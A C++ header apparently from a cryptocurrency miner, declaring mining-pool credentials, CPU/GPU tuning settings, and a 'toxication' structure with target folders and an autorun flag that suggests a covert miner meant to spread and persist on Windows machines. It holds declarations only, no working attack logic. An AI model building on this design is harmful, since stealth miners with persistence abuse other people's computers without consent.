#ifndef MAIN_H_INCLUDED
#define MAIN_H_INCLUDED

#include <iostream>
#include <thread>
#include <cstdint>
#include <filesystem>

#include <string.h>

#include "common.h"

#define STB_SPRINTF_IMPLEMENTATION
#include "stb_sprintf.h"

#ifdef _DEBUG
#define ASSERT(cond) if(!(cond)){*((int*)0) = 0;}
#else
#define ASSERT(cond)
#endif

#if defined(WIN32) || defined(WIN64)
#define PLATFORM_WINDOWS
#include <Windows.h>
#include <tlhelp32.h>
#else

#endif

#define MAX_PATH_SYMBOL_COUNT MAX_PATH
struct mining_pool {
	char PoolName[MAX_PATH_SYMBOL_COUNT];
	char Username[MAX_PATH_SYMBOL_COUNT];
	char Password[MAX_PATH_SYMBOL_COUNT];
};

struct miners_context {

#define MAX_POOL_COUNT 8
	mining_pool Pools[MAX_POOL_COUNT];
	int32_t UsedPoolCount;

	int32_t CPU_LogDuration;
	int32_t CPU_ThreadCount;
	int64_t CPU_Affinity;
	int32_t CPU_Priority;

	int32_t GPU_LogDuration;
	int32_t GPU_Bsleep;
	int32_t GPU_Threads;
	int32_t GPU_Bfactor;

	int32_t Background;
	int32_t DonateLevel;
};

struct toxication_context {
	std::vector<std::wstring> ToxicationFolders;
	int32_t AddToAutorun;
};

enum miner_type {
	MinerType_CPU,
	MinerType_GPU,
};

enum gpu_type {
	GPUType_None,
	GPUType_NVIDIA,
	GPUType_AMD,
};

#endif